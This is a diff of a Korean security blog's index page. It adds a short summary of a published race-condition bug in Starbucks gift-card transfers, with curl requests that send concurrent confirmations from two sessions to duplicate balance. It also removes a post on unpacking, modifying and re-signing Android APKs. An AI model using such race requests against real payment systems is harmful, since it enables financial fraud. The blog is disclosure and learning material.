@@ -9,7 +9,10 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Tencent 보안팀의 Hacking Team Android Browser Exploit 을 요약해본다. vector-exploit-master\src\ht-webkit-Android4-src 디렉토리에 Android Browser exploit 코드가 있다. &hellip;">
+  <meta name="description" content="Hacking Starbucks for unlimited coffee Sakurity 의 글 하나를 요약해본다. race condition 1
+2
+POST /step1?amount=1&from=wallet1&to=wallet2
+POST /step2?confirm 로 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +68,59 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/07/17/hacking-starbucks-for-unlimited-coffee/">Hacking Starbucks for Unlimited Coffee</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-17T20:15:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://sakurity.com/blog/2015/05/21/starbucks.html">Hacking Starbucks for unlimited coffee</a></p>
+
+<p>Sakurity 의 글 하나를 요약해본다.</p>
+
+<h4>race condition</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /step1?amount=1&from=wallet1&to=wallet2
+</span><span class='line'>POST /step2?confirm</span></code></pre></td></tr></table></div></figure>
+
+
+<p>로 two steps 로 되어있는데,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl starbucks/step1 -H Cookie: session=session1 --data amount=1&from=w1&to=w2
+</span><span class='line'>curl starbucks/step1 -H Cookie: session=session2 --data amount=1&from=w1&to=w2
+</span><span class='line'>
+</span><span class='line'>curl starbucks/step2confirm -H Cookie: session=session1 & curl starbucks/step2?confirm -H Cookie: session=session2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>세션 2 개를 만들어서 대여섯번 시도하니, 돈이 복사가 되었다고 한다. 게임에 많이 나오는 돈복사 버그.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1281,77 +1337,6 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/06/30/re-packing-android-apk-files/">Re-packing Android APK Files</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-06-30T11:23:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:23 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4>Packing &amp; Unpacking</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>unzip On*.apk classes.dex
-</span><span class='line'>java -mx512m -jar ./baksmali-2.0.3.jar classes.dex
-</span><span class='line'>keytool -genkey -v -keystore my-release-key.keystore -alias babo -keyalg RSA -keysize 2048 -validity 10000
-</span><span class='line'>java -mx512m -jar ./smali-2.0.3.jar out -o classes.dex
-</span><span class='line'>zip -d On*.apk classes.dex
-</span><span class='line'>zip -d On*.apk "META-INF/*"
-</span><span class='line'>zip On*.apk classes.dex
-</span><span class='line'>jarsigner -storepass &lt;password&gt; -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore On*.apk babo
-</span><span class='line'>adb shell pm uninstall com.xxx.yyy.zzz
-</span><span class='line'>adb install On*.apk</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>aapt</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>aapt dump WHAT file.apk [asset [asset ...]]
-</span><span class='line'>  strings
-</span><span class='line'>  badging
-</span><span class='line'>  permissions
-</span><span class='line'>  resources
-</span><span class='line'>  configurations
-</span><span class='line'>  xmltree
-</span><span class='line'>  xmlstrings</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/5">&larr; Older</a>
@@ -1369,6 +1354,10 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/">Unlocking the Motorola Bootloader by Azimuth Security</a>
       </li>
     
@@ -1382,10 +1371,6 @@ _ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>
     
       <li class="post">
         <a href="/blog/2016/02/11/unlocking-the-motorola-bootloader/">Unlocking the Motorola Bootloader</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/07/the-dependency-of-android-sdk/">The Dependency of Android SDK</a>
       </li>
     
   </ul>
